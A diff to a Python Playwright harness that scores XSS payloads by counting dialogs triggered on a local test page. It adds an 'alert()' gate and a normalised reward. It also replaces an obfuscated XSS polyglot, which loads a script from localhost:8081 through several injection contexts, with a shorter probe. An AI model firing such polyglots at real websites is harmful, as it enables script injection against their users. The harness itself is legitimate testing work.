@@ -21,7 +21,6 @@ async def evaluate(url: str, payload: str) -> bool:
             nonlocal triggered
             triggered = True
             await dialog.dismiss()
-
         page.on("dialog", on_dialog)
 
         target = f"{url}?q={payload}"
@@ -42,6 +41,8 @@ async def testbed(payload: str) -> int:
     return trigger_count
 
 async def local_testbed(payload: str) -> int:
+    if "alert()" not in payload:
+        return 0
     async with async_playwright() as p:
         reward = 0
         async def on_dialog(dialog:Dialog):
@@ -61,9 +62,12 @@ async def local_testbed(payload: str) -> int:
             if triggered:
                 reward += 1
         await page.close()
-        return reward
+        return reward/14
 
 if __name__ == "__main__":
-    polyglot = '<svg onload=alert()><svg onload=alert()><svg onload=alert()><svg onload=alert()><svg onload=alert()><svg onload=alert()>'
+    polyglot = ">/<ScRiPt sRc=`http://localhost:8081/xss.js`></ScRiPt><!---//frAmEsEt>)auDio>'/>-->,jAvAsCriPt:import(\"http://localhost:8081/xss.js\")'/sCrIpT<!-- oNtOgGle=--> oNLoAd=import('http://localhost:8081/xss.js')<!--'(/noScRIpt>>--!> oNFoCus=,sCrIpT/*xMp>*frAmEsEt> oNmOuSeOveR= </noScRIpt><ScRiPt sRc=\"http://localhost:8081/xss.js\"></ScRiPt>>viDeO>&lt;sCrIpT oNLoAd='sVg nOfRaMeS&gt;/bUtTon&gt;sOurCe&gt;nOeMbed&gt;"
     result = asyncio.run(local_testbed(polyglot))
     print("觸發 XSS context 數：", result)
+    polyglot = "alert()<!--javascript:"
+    result = asyncio.run(local_testbed(polyglot))
+    print("觸發 XSS context 數：", result*14)
